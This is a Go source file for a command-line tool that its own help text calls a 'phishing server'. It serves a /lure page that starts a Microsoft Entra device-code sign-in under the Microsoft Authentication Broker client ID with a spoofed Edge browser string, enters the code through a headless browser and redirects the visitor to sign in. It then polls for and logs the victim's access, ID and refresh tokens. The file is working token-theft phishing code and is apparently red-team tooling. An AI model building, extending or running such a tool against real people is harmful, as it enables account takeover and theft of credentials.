package cmd

import (
	"github.com/spf13/cobra"
	"log"
	"log/slog"
	"main/pkg/entra"
	"main/pkg/utils"
	"net/http"
	"time"
)

const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0"
const DefaultTenant string = "common"

var (
	address   string
	userAgent string
	clientId  string
	tenant    string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Provide the listening address (Default ':8080').")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", EdgeOnWindows, "User-Agent string sent in HTTP requests (Default Edge on Windows).")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", MsAuthenticationBroker, "ClientId to request token for. (Default Microsoft Authentication Broker)")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Tenant to request token for. (Default 'common')")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long:  "Starts the phishing server by default on http://localhost:8080/lure",
	Run: func(cmd *cobra.Command, args []string) {
		// Set up a resource handler
		http.HandleFunc("/lure", lureHandler)

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr: address,
		}

		slog.Info("Start Server using Tenant:" + tenant + " ClientId:" + clientId)
		slog.Info("Use address http://localhost" + address + "/lure")
		// Listen to HTTP connections and wait
		log.Fatal(server.ListenAndServe())
	},
}

func lureHandler(w http.ResponseWriter, r *http.Request) {
	slog.Info("Lure opened...")

	http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

	scopes := []string{"openid", "profile", "offline_access"}
	deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
	if err != nil {
		slog.Error("Error during starting device code flow:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
	if err != nil {
		slog.Error("Error during headless browser automation:", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	go startPollForToken(tenant, clientId, deviceAuth)
	http.Redirect(w, r, redirectUri, http.StatusFound)
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second

	for {
		time.Sleep(pollInterval)
		slog.Info("Check for token: " + deviceAuth.UserCode)
		result, err := entra.RequestToken(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error(`"%#v"`, err)
			return
		}

		if result != nil {
			slog.Info("AccessToken for " + deviceAuth.UserCode + ": " + result.AccessToken)
			slog.Info("IdToken for " + deviceAuth.UserCode + ": " + result.IdToken)
			slog.Info("RefreshToken for " + deviceAuth.UserCode + ": " + result.RefreshToken)
			return
		}
	}
}
